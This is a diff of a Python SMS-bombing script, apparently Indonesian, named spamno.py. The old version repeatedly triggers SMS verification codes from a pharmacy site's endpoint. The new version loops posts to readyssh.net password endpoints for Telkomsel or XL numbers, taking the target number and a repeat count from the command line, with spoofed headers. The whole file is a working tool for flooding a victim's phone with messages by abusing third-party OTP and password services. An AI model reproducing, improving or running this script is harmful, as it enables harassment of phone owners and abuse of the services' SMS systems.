@@ -1,39 +1,50 @@
-#coded by Nubzbie
-#Please show author if you want recode
-import requests
+#Do not recode
+#Code simple
+#Author by Nubzbie
+#Cek My Yt Nubzbie nation
+#12-07-2020
+
+import requests as r
+import json, sys
 from requests import post
-import os
-h = '\x1b[1;92m'
-k = '\x1b[1;93m'
-m = '\x1b[1;91m'
-p = '\x1b[1;97m'
-os.system('clear')
-print """{}
-   _____                                                
-  / ___/____  ____ _____ ___        _________ ___  _____
-  \__ \/ __ \/ __ `/ __ `__ \______/ ___/ __ `__ \/ ___/
-{} ___/ / /_/ / /_/ / / / / / /_____(__  ) / / / / (__  ) 
-/____/ .___/\__,_/_/ /_/ /_/     /____/_/ /_/ /_/____/  
-    /_/                                                 
 
-Author : {}Nubzbie{}
-""".format(m,p,h,p)
-no = raw_input('Nomor('+m+'tanpa 0/62'+p+') : ').format(m,p)
-if not no.isdigit():
-  exit(p+"[!]"+k+" Masukkan yg benar"+p)
-jml = int(input("Jumlah : "))
-age = {
-  'Connection':'keep-alive',
-  'User-Agent':'Mozilla/5.0 (Linux; Android 4.4.2; Q510s Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/30.0.0.0 Mobile Safari/537.36 Mobile UCBrowser/3.4.1.483', 
-  'Referer':'https://www.farmaku.com/register',
-}
-nom = {
-  "handphone_number":no+"&",
-  "csrftestname":"f51e2381756c7fd9622eb721c2af0df0",
-}
+def main():
+  pil = sys.argv[1]
+  if pil == "tsel":
+    tsel()
+  elif pil == "xl":
+    xl()
+  else:
+    print ("Contoh : python spamno.py tsel/xl 628**** jumlah")
+  
 
-for a in range(jml):
-  x = requests.post('https://www.farmaku.com/ajax/send_sms_code', data=nom, headers=age).text
-  print (x) + " To "+k+no+p
 
-    
+
+def tsel():
+  no = sys.argv[2]
+  jumlah = int(sys.argv[3])
+  url  = ('https://www.readyssh.net/tembak/tembaktsel/getpassworddd.php')
+  data={'user-agent':'Mozilla/5.0 (Linux; Android 8.1.0; vivo 1820) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.119 Mobile Safari/537.36',
+      'x-requested-with':'XMLHttpRequest',
+      'Referer':'https://www.readyssh.net/paket-internet-murah/bima-tri',}
+      
+  datain={'msisdn':no}
+  for x in range(jumlah):
+    fck = r.post(url,data=datain,headers=data).text
+    fucek = (fck).replace("Password dikirim ke "+no,"").replace("Coba ulangi lagi ya!","")
+    print (fucek)
+def xl():
+  no = sys.argv[2]
+  jumlah = int(sys.argv[3])
+  url  = ('https://www.readyssh.net/tembak/tembakxlbiasa/getpassword.php')
+  data={'user-agent':'Mozilla/5.0 (Linux; Android 8.1.0; vivo 1820) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.119 Mobile Safari/537.36',
+      'x-requested-with':'XMLHttpRequest',
+      'Referer':'https://www.readyssh.net/paket-internet-murah/bima-tri',}
+      
+  datain={'msisdn':no}
+  for x in range(jumlah):
+    fck = r.post(url,data=datain,headers=data).text
+    fucek = (fck).replace("Password dikirim ke "+no,"").replace("Coba ulangi lagi ya!","")
+    print (fucek)
+
+main()
